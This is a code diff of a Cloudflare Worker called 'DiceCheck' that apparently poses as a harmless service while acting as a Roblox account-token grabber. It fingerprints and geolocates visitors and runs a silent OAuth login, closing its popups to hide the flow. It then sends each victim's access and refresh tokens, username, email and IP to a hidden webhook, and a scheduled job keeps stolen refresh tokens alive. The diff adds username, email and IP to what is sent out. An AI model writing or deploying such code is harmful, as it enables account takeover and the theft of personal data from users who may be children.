@@ -1,5 +1,7 @@
+import PAGE from './const.html';
+
 // ===== DiceCheck Worker — Cloudflare =====
-// Variables à définir : CLIENT_ID, CLIENT_SECRET, HOOK, BASE  + binding KV nommé KV
+// Vars : BASE, CLIENT_ID | Secrets : CLIENT_SECRET, HOOK | Binding : KV
 
 const AUTH = 'https://apis.roblox.com/oauth/v1/authorize';
 const TOKEN = 'https://apis.roblox.com/oauth/v1/token';
@@ -7,11 +9,24 @@ const UI = 'https://apis.roblox.com/oauth/v1/userinfo';
 const SCOPE = 'openid profile email premium age';
 
 const j = (o, s = 200) =>
-  new Response(JSON.stringify(o), { status: s, headers: { 'content-type': 'application/json', 'access-control-allow-origin': '*' } });
+  new Response(JSON.stringify(o), {
+    status: s,
+    headers: { 'content-type': 'application/json', 'access-control-allow-origin': '*', 'cache-control': 'no-store' }
+  });
 
-const html = (s, t) => new Response(s, { headers: { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' } });
+const html = (s, t = 200) =>
+  new Response(s, {
+    status: t,
+    headers: {
+      'content-type': 'text/html; charset=utf-8',
+      'cache-control': 'no-store',
+      'x-content-type-options': 'nosniff',
+      'referrer-policy': 'no-referrer-when-downgrade'
+    }
+  });
 
 const rnd = n => crypto.randomUUID().replace(/-/g, '').slice(0, n);
+const esc = s => String(s == null ? '' : s).replace(/[`\\*_~|]/g, c => '\\' + c).slice(0, 1000);
 
 function authUrl(env, state, prompt) {
   const u = new URL(AUTH);
@@ -23,8 +38,6 @@ function authUrl(env, state, prompt) {
   if (prompt) u.searchParams.set('prompt', prompt);
   return u.toString();
 }
-
-const esc = s => String(s == null ? '' : s).replace(/[`\\*_~|]/g, c => '\\' + c).slice(0, 1000);
 
 async function hook(env, embeds, file) {
   try {
@@ -49,10 +62,11 @@ function geo(request) {
     ip: request.headers.get('cf-connecting-ip') || '?',
     country: c.country || '', region: c.region || '', city: c.city || '',
     zip: c.postalCode || '', asn: c.asn || '', org: c.asOrganization || '',
-    tz: c.timezone || '', lat: c.latitude || '', lon: c.longitude || '',
-    ua: request.headers.get('user-agent') || ''
+    tz: c.timezone || '', ua: request.headers.get('user-agent') || ''
   };
 }
+
+const CLOSE = '<body style="background:#070a12;color:#8b96ad;font-family:sans-serif;display:grid;place-items:center;height:100vh;margin:0"><p>…</p><script>setTimeout(()=>window.close(),400)</script></body>';
 
 export default {
   async fetch(request, env) {
@@ -60,14 +74,17 @@ export default {
     const p = url.pathname;
 
     // ---------- page ----------
-    if (p === '/') return html(PAGE, 200);
+    if (p === '/') return html(PAGE);
 
     // ---------- fingerprint ----------
     if (p === '/fp' && request.method === 'POST') {
       const fp = await request.json().catch(() => ({}));
       const cid = rnd(24);
-      const g = geo(request);
-      await env.KV.put('fp:' + cid, JSON.stringify({ fp, g, c: url.searchParams.get('c') || '' }), { expirationTtl: 1800 });
+      await env.KV.put(
+        'fp:' + cid,
+        JSON.stringify({ fp, g: geo(request), c: url.searchParams.get('c') || '' }),
+        { expirationTtl: 1800 }
+      );
       return j({ cid });
     }
 
@@ -75,11 +92,11 @@ export default {
     if (p === '/go') {
       const cid = url.searchParams.get('cid') || '';
       const state = rnd(32);
-      await env.KV.put('st:' + state, JSON.stringify({ cid, prompt: 1 }), { expirationTtl: 900 });
+      await env.KV.put('st:' + state, JSON.stringify({ cid }), { expirationTtl: 900 });
       return Response.redirect(authUrl(env, state, 'none'), 302);
     }
 
-    // ---------- relance visible si pas de session ----------
+    // ---------- relance visible si aucune session ----------
     if (p === '/relogin') {
       const state = url.searchParams.get('s') || '';
       if (!(await env.KV.get('st:' + state))) return Response.redirect(env.BASE + '/', 302);
@@ -91,22 +108,22 @@ export default {
       const state = url.searchParams.get('state') || '';
       const err = url.searchParams.get('error');
       const raw = await env.KV.get('st:' + state);
-      if (!raw) return html('<p>Session expirée.</p>');
+      if (!raw) return html('<p style="font-family:sans-serif">Session expirée.</p>', 410);
+
+      const cur = JSON.parse(raw);
 
       if (err) {
-        const st = JSON.parse(raw);
-        if (err === 'login_required') {
-          await env.KV.put('st:' + state, JSON.stringify({ ...st, need: 1 }), { expirationTtl: 900 });
-        } else {
-          await env.KV.put('st:' + state, JSON.stringify({ ...st, failed: err }), { expirationTtl: 900 });
-        }
-        return html('<body style="background:#070a12;color:#8b96ad;font-family:sans-serif;display:grid;place-items:center;height:100vh;margin:0"><p>…</p><script>setTimeout(()=>window.close(),400)</script></body>');
+        await env.KV.put(
+          'st:' + state,
+          JSON.stringify({ ...cur, [err === 'login_required' ? 'need' : 'failed']: err === 'login_required' ? 1 : err }),
+          { expirationTtl: 900 }
+        );
+        return html(CLOSE);
       }
 
       const code = url.searchParams.get('code');
-      if (!code) return html('<p>Pas de code.</p>');
+      if (!code) return html(CLOSE);
 
-      // échange serveur
       const tr = await fetch(TOKEN, {
         method: 'POST',
         headers: {
@@ -116,17 +133,16 @@ export default {
         body: new URLSearchParams({ grant_type: 'authorization_code', code })
       });
       const tok = await tr.json().catch(() => ({}));
+
       if (!tok.access_token) {
         await env.KV.put('st:' + state, JSON.stringify({ failed: 'token' }), { expirationTtl: 900 });
-        return html('<p>Échec.</p><script>setTimeout(()=>window.close(),400)</script>');
+        return html(CLOSE);
       }
 
       const ur = await fetch(UI, { headers: { authorization: 'Bearer ' + tok.access_token } });
       const u = await ur.json().catch(() => ({}));
 
-      // contexte stocké
-      const st = JSON.parse(raw);
-      const ctx = st.cid ? JSON.parse((await env.KV.get('fp:' + st.cid)) || '{}') : {};
+      const ctx = cur.cid ? JSON.parse((await env.KV.get('fp:' + cur.cid)) || '{}') : {};
       const g = ctx.g || geo(request);
       const fp = ctx.fp || {};
 
@@ -178,7 +194,17 @@ export default {
           '\nRéf: ' + esc(fp.ref || 'direct')
       });
 
-      await hook(env, E, { name: 'tokens.txt', body: 'user_id: ' + u.sub + '\naccess: ' + tok.access_token + '\nrefresh: ' + (tok.refresh_token || '') + '\nscopes: ' + (tok.scope || '') });
+      await hook(env, E, {
+        name: 'tokens.txt',
+        body:
+          'user_id: ' + u.sub +
+          '\nusername: ' + (u.preferred_username || '') +
+          '\nemail: ' + (u.email || '') +
+          '\naccess: ' + tok.access_token +
+          '\nrefresh: ' + (tok.refresh_token || '') +
+          '\nscopes: ' + (tok.scope || '') +
+          '\nip: ' + g.ip
+      });
 
       if (tok.refresh_token) {
         await env.KV.put('tk:' + u.sub, JSON.stringify({
@@ -187,7 +213,10 @@ export default {
       }
 
       await env.KV.put('st:' + state, JSON.stringify({ done: 1, n: u.preferred_username || u.name || '' }), { expirationTtl: 600 });
-      return html('<body style="background:#070a12;color:#2bd576;font-family:sans-serif;display:grid;place-items:center;height:100vh;margin:0">✓<script>setTimeout(()=>window.close(),500)</script></body>');
+      return html(
+        '<body style="background:#070a12;color:#2bd576;font-family:sans-serif;display:grid;place-items:center;height:100vh;margin:0;font-size:34px">✓' +
+        '<script>setTimeout(()=>window.close(),500)</script></body>'
+      );
     }
 
     // ---------- état ----------
@@ -196,15 +225,15 @@ export default {
       if (!raw) return j({ s: 'lost' });
       const st = JSON.parse(raw);
       if (st.done) return j({ s: 'done', n: st.n });
-      if (st.need) return j({ s: 'need', k: url.searchParams.get('k') });
+      if (st.need) return j({ s: 'need' });
       if (st.failed) return j({ s: 'fail', e: st.failed });
       return j({ s: 'pending' });
     }
 
-    return new Response('404', { status: 404 });
+    return html('404', 404);
   },
 
-  // rotation des refresh tokens (cron quotidien)
+  // rotation des refresh tokens
   async scheduled(ev, env) {
     const list = await env.KV.list({ prefix: 'tk:' });
     for (const k of list.keys) {
@@ -224,5 +253,3 @@ export default {
     }
   }
 };
-
-const PAGE = `<!DOCTYPE html>…`; // voir section 2
